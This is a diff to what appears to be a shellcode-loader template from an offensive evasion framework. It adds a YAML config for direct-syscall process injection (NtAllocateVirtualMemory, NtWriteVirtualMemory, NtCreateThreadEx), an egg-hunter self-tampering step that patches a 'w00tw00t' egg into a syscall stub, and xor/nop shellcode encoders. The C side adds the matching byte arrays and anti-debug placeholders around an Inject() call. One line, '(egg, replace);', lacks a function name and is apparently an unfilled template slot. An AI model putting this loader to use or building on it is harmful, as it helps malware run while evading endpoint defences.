@@ -1,3 +1,40 @@
+modules:
+  syscalls:
+    functions:
+      - NtAllocateVirtualMemory
+      - NtWriteVirtualMemory
+      - NtCreateThreadEx
+    parameters:
+      recovery:
+        egg_hunter
+      egg:
+        "7730307477303074"
+    requires:
+      self_tampering
+  self_tampering:
+    parameters:
+      - "7730307477303074"
+      - "0F05C3909090CCCC"
+compiler:
+  name:
+    cl
+  out:
+    dll
+  def:
+    LIBRARY $1
+    EXPORTS
+    $2
+shellcode:
+  format:
+    blob
+  encoders:
+    - xor
+    - nop
+prototypes:
+  1
+
+---- CODE
+
 #include <Windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -74,7 +111,13 @@ int Inject()
 
 int main(int argc, char** argv) {
 
-    // LoadLibrary(L"C:\\inceptor\\libs\\private\\x64\\syscall-detect.dll");
+    // LoadLibrary(L"C:\\Users\\d3adc0de\\Desktop\\Shared\\PenetrationTesting\\Git Personal Projects\\inceptor\\inceptor\\libs\\private\\x64\\syscall-detect.dll");
+
+    unsigned char egg[] = { 0x77, 0x00, 0x00, 0x74, 0x77, 0x00, 0x00, 0x74 }; // w00tw00t
+	unsigned char replace[] = { 0x0f, 0x05, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC }; // syscall; nop; nop; ret; nop; int3; int3
+
+	//####SELF_TAMPERING####
+	(egg, replace);
 
     //####ANTIDEBUG####
     //####ARGS####
@@ -82,4 +125,5 @@ int main(int argc, char** argv) {
 
 	Inject();
 
+    return 0;
 }
